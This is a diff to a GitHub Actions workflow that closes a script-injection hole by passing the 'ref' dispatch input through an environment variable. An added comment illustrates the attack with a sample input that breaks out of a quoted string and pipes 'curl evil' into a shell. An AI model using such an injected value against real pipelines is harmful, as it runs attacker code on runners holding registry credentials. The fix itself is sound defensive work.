@@ -36,8 +36,16 @@ jobs:
 
       - name: Resolve the tag to rebuild
         id: target
+        # INPUT_REF through the environment, never interpolated into the script.
+        #
+        # `ref="${{ inputs.ref }}"` substitutes the free-text workflow_dispatch input into the shell BEFORE
+        # bash parses it, so a value like `v1.0.0"; curl evil | sh; "` runs on a runner that holds the
+        # registry credentials. An env var is passed as data and expanded by bash, which cannot execute it.
+        # The sibling workflows were fixed for exactly this; this one was missed.
+        env:
+          INPUT_REF: ${{ inputs.ref }}
         run: |
-          ref="${{ inputs.ref }}"
+          ref="$INPUT_REF"
           if [ -z "$ref" ]; then
             ref=$(git tag --list 'v*' --sort=-v:refname | head -n1)
           fi
